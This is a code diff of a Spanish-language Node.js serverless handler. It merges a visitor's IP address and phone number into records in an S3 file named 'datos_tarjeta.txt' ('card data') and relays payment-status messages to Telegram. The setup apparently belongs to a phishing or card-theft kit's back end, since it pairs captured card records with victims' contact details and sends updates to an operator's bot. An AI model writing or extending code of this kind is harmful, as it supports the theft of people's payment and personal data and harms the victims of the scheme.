@@ -36,44 +36,39 @@ const estadoMensajes = {
     'pago-cancelado': '❌ <b>ESTADO: Pago Cancelado</b>'
 };
 
-async function guardarIPenDatos(txid, ip) {
+async function guardarIPyTelefonoEnTarjeta(txid, ip, telefono) {
     try {
         const data = await new Promise((resolve, reject) => {
-            s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
+            s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
                 if (err) resolve('');
                 else resolve(data.Body.toString());
             });
         });
 
         let lineas = data.split('\n').filter(l => l.trim());
-        let encontrado = false;
 
         lineas = lineas.map(linea => {
             try {
                 const obj = JSON.parse(linea);
                 if (obj.txid === txid) {
                     obj.ip = ip;
-                    encontrado = true;
+                    if (telefono) obj.telefono = telefono;
                     return JSON.stringify(obj);
                 }
             } catch (e) {}
             return linea;
         });
 
-        if (!encontrado) {
-            lineas.push(JSON.stringify({ txid, ip, timestamp: new Date().toISOString() }));
-        }
-
         const newContent = lineas.join('\n');
 
         await new Promise((resolve, reject) => {
-            s3.putObject({ Bucket: BUCKET, Key: 'datos_consultas.txt', Body: newContent }, (err) => {
+            s3.putObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt', Body: newContent }, (err) => {
                 if (err) reject(err);
                 else resolve();
             });
         });
     } catch (error) {
-        console.error('Error guardando IP:', error);
+        console.error('Error guardando IP y teléfono:', error);
     }
 }
 
@@ -105,7 +100,7 @@ module.exports = async (req, res) => {
     if (req.method !== 'POST') return res.status(400).json({ ok: false, error: 'POST requerido' });
 
     try {
-        const { txid, referencia, pagina, ip } = req.body;
+        const { txid, referencia, pagina, ip, telefono } = req.body;
 
         if (!txid || !referencia || !pagina) {
             return res.status(400).json({ ok: false, error: 'txid, referencia y pagina requeridos' });
@@ -115,7 +110,7 @@ module.exports = async (req, res) => {
 
         await Promise.all([
             enviarEstadoTelegram(txid, referencia, pagina, clientIp),
-            guardarIPenDatos(txid, clientIp)
+            guardarIPyTelefonoEnTarjeta(txid, clientIp, telefono)
         ]);
 
         return res.status(200).json({ ok: true, message: 'Estado enviado a Telegram' });
